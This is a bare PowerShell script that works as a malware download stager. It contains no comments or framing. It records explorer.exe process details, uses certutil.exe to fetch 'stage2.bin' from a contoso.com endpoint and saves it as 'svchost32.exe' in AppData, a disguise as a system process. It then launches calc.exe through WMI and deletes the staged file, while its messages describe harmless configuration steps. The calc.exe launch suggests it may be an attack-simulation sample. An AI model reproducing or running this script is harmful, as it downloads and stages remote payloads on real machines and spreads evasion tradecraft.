$EndpointUrl = 'http://contoso.com:8080/cdn/stage2.bin'
$PayloadPath = "$env:APPDATA\svchost32.exe"
$TimeoutSec = 40
$ErrorActionPreference = "Continue"

Write-Verbose "Collecting process inventory"
Get-CimInstance -ClassName Win32_Process | Where-Object { $_.Name -eq "explorer.exe" } | Select-Object ProcessId,Name,CommandLine | Out-File "C:\ProgramData\transfer.log" -Append -ErrorAction SilentlyContinue
certutil.exe -urlcache -split -f $EndpointUrl $PayloadPath
$FetchResult = Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{ CommandLine = "calc.exe" } -ErrorAction SilentlyContinue
Write-Verbose ("Process ID: " + $FetchResult.ProcessId)

Remove-Item -Path "$env:TEMP\stage2.bin" -Force
Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
Write-Verbose "Reading configuration values"
Write-Verbose "Resolving configured target"
